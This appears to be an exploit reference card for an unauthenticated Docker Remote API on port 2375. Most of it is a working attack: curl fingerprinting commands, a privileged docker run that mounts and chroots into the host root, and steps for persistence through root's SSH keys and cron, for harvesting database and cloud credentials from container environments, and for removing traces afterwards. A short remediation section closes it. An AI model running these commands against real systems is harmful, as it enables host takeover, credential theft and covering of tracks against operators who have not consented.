---
title: Docker Remote API Unauthenticated (Take the Host Directly)
cve: No CVE (misconfiguration)
severity: critical
cvss: 9.8
product: Docker Engine
versions: Any (2375 exposed)
ports: 2375, 2376
keywords: docker, api, 2375, privileged, escape
verified: false
sources: Compiled from public sources (business-logic / implementation / misconfiguration classes, no CVE; see references below)
---

## Fingerprint

```bash
curl -s http://target:2375/version
curl -s http://target:2375/containers/json
```

Returning JSON means unauthenticated.

## Prerequisites

- 2375 reachable in plaintext (common on CI machines, Jenkins agents, K8s nodes).

## PoC

```bash
docker -H tcp://target:2375 ps

# Mount the host root to get the whole disk
docker -H tcp://target:2375 run -it --rm --privileged \
  -v /:/host alpine chroot /host sh
```

## Exploitation steps

1. Confirm unauthenticated access with `curl /version` and `/containers/json`; check `/images/json` for existing images (avoids pulling).
2. Use `-v /:/host` + `chroot` to access the host filesystem; `-v /var/run/docker.sock:/x` gives further control.
3. Establish persistence: write the host's `/root/.ssh/authorized_keys`, `/etc/cron.d/`; or `docker exec` into business containers and modify code directly.
4. Harvest data: list business containers via `/containers/json` → `docker exec` → environment variables often hold DB/cloud credentials.
5. Cleanup: remove the containers you created (`docker rm -f`); leave no traces such as `alpine`.

## Remediation and mitigation

- Bind 2375 to 127.0.0.1 only; expose only 2376 with mutual TLS.
- Detection: anomalies around `docker run --privileged` in `/var/log/docker.log` or auditd.

## References

- Docker's official "Protect the Docker daemon socket".
